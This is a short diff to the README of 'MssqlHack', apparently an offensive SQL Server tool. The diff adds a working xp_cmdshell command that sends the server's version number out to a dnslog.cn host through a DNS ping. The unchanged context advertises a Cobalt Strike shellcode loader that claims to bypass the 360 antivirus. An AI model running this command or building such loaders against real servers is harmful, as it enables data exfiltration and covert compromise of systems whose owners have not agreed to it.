@@ -1,5 +1,10 @@
 # MssqlHack
 sqlserver通过clr执行一些基础操作
+
+**如果能执行xp_cmdshell可通过一下sql获取版本。**
+```
+DECLARE @info varchar(1024);SELECT @info='ping '+(SELECT SUBSTRING((select @@version),22,4))+'.d0b4016a.dnslog.cn';EXEC master..xp_cmdshell @info;
+```
 ## 功能：
 一、shellcode loader直接上线cs(可bypass360)
 
